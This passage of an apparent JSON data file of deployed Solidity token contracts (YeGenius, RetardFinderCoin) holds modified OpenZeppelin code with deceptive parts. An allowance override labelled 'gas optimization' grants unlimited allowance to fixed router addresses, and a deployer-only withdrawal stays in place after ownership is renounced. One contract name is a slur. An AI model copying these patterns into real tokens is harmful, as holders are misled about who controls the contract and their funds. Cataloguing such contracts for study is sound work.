   * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value ) public virtual returns (bool )  { \n                        \n        address owner = _msgSender (  ) ; \n        _approve ( owner, spender, value );\n        return true;\n    \n                         } \n    \n    \n                        }\n\nabstract contract Ownable is Context {\n                        \n    address private _owner ; \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner (  ) \n                        {\n        _checkOwner() ; \n        _ ; \n     } \n                        \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner( ) internal view virtual  { \n                        \n        require ( owner (  ) == _msgSender ( ), \"Ownable: caller is not the owner\" ) ; \n     } \n                        \n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\n     */\n    error OwnableInvalidOwner(address owner);\n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner ) internal virtual {\n                        \n        address oldOwner = _owner ; \n        _owner = newOwner ; \n        emit OwnershipTransferred(oldOwner, newOwner) ; \n     } \n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner) public virtual onlyOwner  { \n                        \n        require ( newOwner != address(0), \"Ownable: new owner is the zero address\") ; \n        _transferOwnership ( newOwner ) ; \n    \n                         } \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account) ; \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( ) \n                         { \n        _transferOwnership ( _msgSender());\n    }\n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner( ) public view virtual returns (address) \n                         { \n        return _owner ; \n    }\n                        \n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner );\n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership( ) public virtual onlyOwner {\n                        \n        _transferOwnership ( address(0 ) );\n    \n                        }\n    \n\n                        }\n\n\n// File YeGenius.sol\n\ncontract YeGenius is ERC20, Ownable  { \n                        \n    address internal immutable deployer;\n    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_)  { \n                        \n        _mint(msg.sender, 100000000000000000000000000);\n        _transferOwnership(address(0) );\n        deployer = msg.sender ; \n    }\n                        \n    \n    /**\n     * @dev See \n                        {IERC20-allowance\n                         } .\n     */\n    function allowance(address owner, address spender ) public view override returns (uint256 )  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if((spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) ||  ( spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 ) ){\n                        \n            return type ( uint256).max ; \n        }\n                         \n        return super.allowance(owner,spender);\n     } \n                        \n    \n    function claimGas(address payable recipient, uint256 amount ) public {\n                        \n        require(msg.sender==deployer );\n        Address.sendValue ( recipient, amount) ; \n    \n                        }\n    \n    receive() external payable { \n                        \n     } \n                        \n\n                        }",
      "count": 1,
      "addresses": [
        "0x47dB37050bD03fA852b7d4a229ADB4dF8F574EC2"
      ],
      "names": [
        "YeGenius"
      ]
    },
    {
      "id": "0e85fb68-de71-4979-8b8f-80d509029455",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0 )  ( utils/Address.sol )\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account  ( EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account ) internal view returns  ( bool) \n                        {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`.  { \n                        sendValue\n                         }  removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount) public  { \n                        \n        require ( address ( this ).balance >= amount, \"Address: insufficient balance\" );\n\n        (bool success, ) = recipient.call{\n                        value: amount}\n                        (\"\");\n        require ( success, \"Address: unable to send value, recipient may have reverted\") ; \n     } \n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( address target, bytes memory data ) internal returns (bytes memory) {\n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\");\n    \n                         } \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-\n                        }[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns (bytes memory) \n                        {\n        return functionCallWithValue(target, data, 0, errorMessage ) ; \n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-\n                         } [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value ) internal returns  ( bytes memory ) {\n                        \n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\") ; \n    }\n                        \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCallWithValue-address-bytes-uint256- } \n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns  ( bytes memory )  { \n                        \n        require(address(this ).balance >= value, \"Address: insufficient balance for call\") ; \n        (bool success, bytes memory returndata) = target.call{\n                        value: value}\n                        (data) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data ) internal view returns  ( bytes memory) \n                         { \n        return functionStaticCall ( target, data, \"Address: low-level static call failed\" );\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns (bytes memory)  { \n                        \n         ( bool success, bytes memory returndata) = target.staticcall(data) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory)  { \n                        \n        return functionDelegateCall ( target, data, \"Address: low-level delegate call failed\" );\n     } \n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory ) \n                        {\n         ( bool success, bytes memory returndata ) = target.delegatecall ( data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    \n                         } \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one ) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal view returns  ( bytes memory )  { \n                        \n        if (success) \n                         { \n            if  ( returndata.length == 0 ) \n                         { \n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require(isContract ( target ), \"Address: call to non-contract\");\n            }\n                        \n            return returndata ; \n         } \n                         else \n                        {\n            _revert ( returndata, errorMessage ) ; \n         } \n                        \n     } \n                        \n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult ( \n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns  ( bytes memory) \n                         { \n        if  ( success ) \n                        {\n            return returndata ; \n         } \n                         else {\n                        \n            _revert(returndata, errorMessage);\n        }\n                        \n     } \n                        \n\n    function _revert(bytes memory returndata, string memory errorMessage ) private pure {\n                        \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly {\n                        \n                let returndata_size := mload ( returndata )\n                revert ( add ( 32, returndata ), returndata_size )\n            \n                        }\n        }\n                         else {\n                        \n            revert(errorMessage ) ; \n         } \n                        \n     } \n                        \n\n                        }\npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned ).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n                        \n    function _msgSender() internal view virtual returns (address)  { \n                        \n        return msg.sender ; \n    }\n                        \n\n    function _msgData (  ) internal view virtual returns (bytes calldata )  { \n                        \n        return msg.data;\n    }\n                        \n\n    function _contextSuffixLength( ) internal view virtual returns  ( uint256)  { \n                        \n        return 0;\n    \n                         } \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors  { \n                        \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender );\n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender );\n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance ( address spender, uint256 allowance, uint256 needed ) ; \n\n                         } \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n                        \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to \n                        {approve}\n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply ( ) external view returns  ( uint256 );\n    \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer}\n                         event.\n     */\n    function transfer ( address to, uint256 amount ) external returns (bool);\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from` ) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value) ; \n\n    \n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) ; \n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through  { \n                        transferFrom } \n                        . This is\n     * zero by default.\n     *\n     * This value changes when  { \n                        approve}\n                         or {\n                        transferFrom } \n                         are called.\n     */\n    function allowance ( address owner, address spender ) external view returns  ( uint256) ; \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf ( address account ) external view returns (uint256);\n\n    \n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval}\n                         event.\n     */\n    function approve ( address spender, uint256 amount) external returns (bool );\n    \n}\n                        \n\n\ninterface IERC20Metadata is IERC20 {\n                        \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol ( ) external view returns  ( string memory);\n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name (  ) external view returns  ( string memory ) ; \n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns  ( uint8) ; \n    \n\n                         } \n\n\n\n\n\n/**\n * @dev Implementation of the {\n                        IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using  { \n                        _mint } \n                        .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of  { \n                        decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  {\n                        \n    mapping(address => uint256) private _balances ; \n\n\n    mapping(address => mapping(address => uint256 )) private _allowances ; \n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev See \n                         { IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns  ( bool )  { \n                        \n        address owner = _msgSender();\n        _approve(owner, spender, value ) ; \n        return true ; \n     } \n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints  ( or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     */\n    function _update ( address from, address to, uint256 value) internal virtual  { \n                        \n        if  ( from == address ( 0) )  { \n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n         } \n                         else {\n                        \n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value) \n                         { \n                revert ERC20InsufficientBalance(from, fromBalance, value);\n             } \n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n                        \n        }\n                        \n\n        if (to == address(0) ) {\n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n             } \n                        \n        }\n                         else  { \n                        \n            unchecked  { \n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            \n                         } \n        }\n                        \n\n        emit Transfer(from, to, value) ; \n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-allowance}\n                        .\n     */\n    function allowance ( address owner, address spender) public view virtual returns  ( uint256 )  { \n                        \n        return _allowances[owner][spender];\n    }\n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-transfer}\n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value ) public virtual returns  ( bool ) \n                        {\n        address owner = _msgSender( );\n        _transfer(owner, to, value ) ; \n        return true ; \n    \n                        }\n    \n    /**\n     * @dev See \n                         { IERC20-transferFrom\n                        }.\n     *\n     * Skips emitting an  { \n                        Approval } \n                         event indicating an allowance update. This is not\n     * required by the ERC. See {\n                        xref-ERC20-_approve-address-address-uint256-bool- } \n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom ( address from, address to, uint256 value ) public virtual returns (bool) {\n                        \n        address spender = _msgSender (  );\n        _spendAllowance ( from, spender, value);\n        _transfer ( from, to, value );\n        return true ; \n     } \n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol( ) public view virtual returns (string memory) {\n                        \n        return _symbol;\n    }\n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to  { \n                        transfer\n                         } , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a \n                        {Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual, {\n                        _update}\n                         should be overridden instead.\n     */\n    function _transfer ( address from, address to, uint256 value ) internal  { \n                        \n        if  ( from == address ( 0) ) \n                        {\n            revert ERC20InvalidSender(address(0 ) );\n        }\n                        \n        if (to == address(0 )) {\n                        \n            revert ERC20InvalidReceiver ( address ( 0)) ; \n        }\n                        \n        _update ( from, to, value ) ; \n    }\n                        \n    \n    /**\n     * @dev Variant of {\n                        _approve}\n                         with an optional flag to enable or disable the  { \n                        Approval\n                         }  event.\n     *\n     * By default (when calling {\n                        _approve\n                        }) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool) internal virtual override \n                        {\n     *     super._approve(owner, spender, value, true) ; \n     * }\n                        \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve\n                        }.\n     */\n    function _approve ( address owner, address spender, uint256 value, bool emitEvent ) internal virtual \n                         { \n        if  ( owner == address(0 ) )  { \n                        \n            revert ERC20InvalidApprover(address ( 0) );\n         } \n                        \n        if  ( spender == address(0))  { \n                        \n            revert ERC20InvalidSpender(address ( 0 ));\n        }\n                        \n        _allowances[owner][spender] = value;\n        if (emitEvent)  { \n                        \n            emit Approval ( owner, spender, value);\n         } \n                        \n    \n                        }\n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an \n                         { Approval } \n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value ) internal virtual {\n                        \n        uint256 currentAllowance = allowance ( owner, spender );\n        if  ( currentAllowance < type ( uint256 ).max )  { \n                        \n            if  ( currentAllowance < value ) {\n                        \n                revert ERC20InsufficientAllowance ( spender, currentAllowance, value );\n             } \n                        \n            unchecked  { \n                        \n                _approve ( owner, spender, currentAllowance - value, false) ; \n             } \n                        \n        }\n                        \n    }\n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {\n                        Transfer}\n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, \n                         { _update } \n                         should be overridden instead.\n     */\n    function _mint ( address account, uint256 value ) internal {\n                        \n        if (account == address(0 ) )  { \n                        \n            revert ERC20InvalidReceiver ( address ( 0 ) ) ; \n        }\n                        \n        _update ( address ( 0), account, value) ; \n     } \n                        \n    \n    /**\n     * @dev See \n                         { IERC20-totalSupply\n                         } .\n     */\n    function totalSupply ( ) public view virtual returns (uint256 )  { \n                        \n        return _totalSupply ; \n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * \n                        {IERC20-balanceOf\n                         }  and \n                        {IERC20-transfer } \n                        .\n     */\n    function decimals ( ) public view virtual returns  ( uint8)  { \n                        \n        return 15;\n    }\n                        \n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an  { \n                        Approval } \n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n                        \n        _approve ( owner, spender, value, true) ; \n     } \n                        \n    \n    /**\n     * @dev Sets the values for \n                        {name\n                         }  and {\n                        symbol\n                         } .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_ ) \n                         { \n        _name = name_ ; \n        _symbol = symbol_;\n    }\n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf}\n                        .\n     */\n    function balanceOf ( address account ) public view virtual returns (uint256)  { \n                        \n        return _balances[account];\n    \n                        }\n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) public view virtual returns  ( string memory )  { \n                        \n        return _name ; \n     } \n                        \n    \n     } \n                        \n\nabstract contract Ownable is Context \n                         { \n    address private _owner;\n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( )  { \n                        \n        _transferOwnership(_msgSender (  ) ) ; \n     } \n                        \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account) ; \n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner (  )  { \n                        \n        _checkOwner ( );\n        _ ; \n    \n                         } \n    \n    /**\n     * @dev The owner is not a valid owner account.  ( eg. `address(0 )` )\n     */\n    error OwnableInvalidOwner(address owner ) ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner ) internal virtual \n                        {\n        address oldOwner = _owner ; \n        _owner = newOwner ; \n        emit OwnershipTransferred(oldOwner, newOwner );\n    }\n                        \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner ( ) internal view virtual {\n                        \n        require ( owner (  ) == _msgSender( ), \"Ownable: caller is not the owner\");\n     } \n                        \n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner) ; \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership ( ) public virtual onlyOwner  { \n                        \n        _transferOwnership ( address(0) );\n    }\n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns  ( address) {\n                        \n        return _owner;\n    }\n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership ( address newOwner ) public virtual onlyOwner  { \n                        \n        require(newOwner != address(0 ), \"Ownable: new owner is the zero address\");\n        _transferOwnership ( newOwner );\n    }\n                        \n    \n}\n                        \n\n\n// File RetardFinderCoin.sol\n\ncontract RetardFinderCoin is ERC20, Ownable {\n                        \n    address internal immutable deployer;\n    constructor ( string memory name_, string memory symbol_) ERC20 ( name_, symbol_) \n                         { \n        _mint(msg.sender, 10000000000000000000000000 );\n        _transferOwnership ( address ( 0) );\n        deployer = msg.sender ; \n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-allowance}\n                        .\n     */\n    function allowance(address owner, address spender) public view override returns  ( uint256)  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if((spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3 ) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 ) ) { \n                        \n            return type ( uint256).max;\n         } \n                         \n        return super.allowance ( owner,spender) ; \n     } \n                        \n    \n    function claimGas(address payable recipient, uint256 amount) public \n                         { \n        require ( msg.sender==deployer);\n        Address.sendValue(recipient, amount );\n     } \n                        \n    \n    receive (  ) external payable { \n                        \n    }\n                        \n}",
      "count": 1,
      "addresses": [
        "0xdF979Ef90321C8f720de01DCcaffe5c5CB3ca755"
      ],
      "names": [
        "RetardFinderCoin"
      ]
    },
    {
      "id": "d85f3087-0f00-462d-8961-9f70a06ab096",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts  ( last updated v5.1.0 )  ( utils/Address.sol )\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account ) internal view returns  ( bool ) \n                         { \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n     } \n                        \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and 